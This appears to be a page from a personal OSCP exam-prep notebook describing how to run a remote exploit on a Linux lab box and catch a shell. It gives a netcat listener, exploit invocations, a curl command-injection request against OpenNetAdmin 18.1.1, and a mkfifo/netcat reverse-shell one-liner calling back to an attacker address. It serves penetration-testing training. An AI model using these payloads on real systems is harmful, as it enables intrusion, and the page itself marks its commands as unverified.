# Linux - RCE to Shell

**Step 11 of 50 · Linux**

*Run a confirmed remote exploit and catch the resulting shell.*

## Run this

> **Why:** This version or banner check identifies the exact product release before a matching public exploit is considered.
```bash
nc -lnvp $Lport
perl $ExploitFile $BoxIP
python3 $ExploitFile $BoxIP
```

## Example output

 > *Example shape only: the exact exploit invocation is not yet verified against a real box.*
```
[+] Exploit sent
listening on 0.0.0.0 $Lport ...
connect to 10.10.10.1 from 10.10.10.2
$ whoami
username
```
## What did you get?

- [ ] A reverse shell connects to the listener → **Run `id` in the received shell, then go to Step 12 · [[Linux - Shell Stabilise]]**
- [ ] The exploit opens a bind shell on the target → **Set `$Port` to the bind-shell port, run `nc -nv $BoxIP $Port`, then go to Step 12 · [[Linux - Shell Stabilise]]**
- [ ] The shell comes back as root → **Run `id` and `whoami` to confirm UID 0, record the proof path privately, and go to Step 21 · [[Linux - Clean Down]]**
- [ ] The exploit returns an error → **Copy the complete error into `$BoxDir/loot/exploit-error.txt`, then go to Step 10 · [[Linux - Exploit Search]]**
- [ ] A shell connects but has no job control → **Go to Step 12 · [[Linux - Shell Stabilise]]**
- [ ] No callback after multiple attempts → **Run `sudo tcpdump -ni tun0 'host $BoxIP and tcp'`, try the documented bind-shell command, then retry the reverse shell on `$ListenPort` only once**

## OpenNetAdmin 18.1.1 command injection

For OpenNetAdmin 18.1.1, the vulnerable `xajaxargs[]=ip=>` parameter accepts a shell command. Validate it with identity output before sending a callback, then extract only the text between markers from the XML response.

> **Why:** This request proves command execution as the web-service account while keeping the response readable.
```bash
curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";id;echo \"END\"&xajaxargs[]=ping" \
  http://$BoxIP/ona/ | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
```

> [!warning] 💡
> A `/dev/tcp` payload requires Bash. If the injected command is interpreted by `/bin/sh`, use the FIFO and netcat payload from the shell section instead.

## Notes

Only run the interpreter command that matches the exploit file. For reverse shells use RevShells to generate the payload matching the available interpreter (`bash`, `python3`, `perl`, `php`).

## Gotcha

> [!warning] 💡
> The exact exploit invocation depends on the discovered service. If it was not tested in the write-ups, confirm it before relying on it.

> [!warning] 💡
> If the payload uses `/dev/tcp` syntax, it requires bash. Shells that run via `/bin/sh` (e.g. from PostgreSQL `COPY TO PROGRAM`, some CGI handlers) will silently fail on bash-only payloads. Use a mkfifo or nc-based payload instead: `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $LocalIP $Lport > /tmp/f`

> [!warning]
> Command not yet verified against a real box. Confirm the exact exploit interpreter, arguments, and listener port before relying on this page in an exam.
## Seen in
- [[OSCP/BOXES/WRITE UPS/Linux/5. Bratarina|Bratarina]] -- confirmed in the box write-up
- [[OSCP/BOXES/WRITE UPS/Linux/1. clamAV|clamAV]] -- confirmed in the box write-up
- [[OSCP/BOXES/WRITE UPS/Linux/4. Snookums|Snookums]] -- confirmed in the box write-up
- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- authenticated plugin upload produced a reverse shell
- [[OSCP/BOXES/WRITE UPS/Linux/OpenAdmin|OpenAdmin]] -- ONA command injection produced a FIFO/netcat reverse shell

## Related stages

- [[Linux - Service Scan]]
- [[Linux - Web Enum]]
- [[Linux - Exploit Search]]

## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
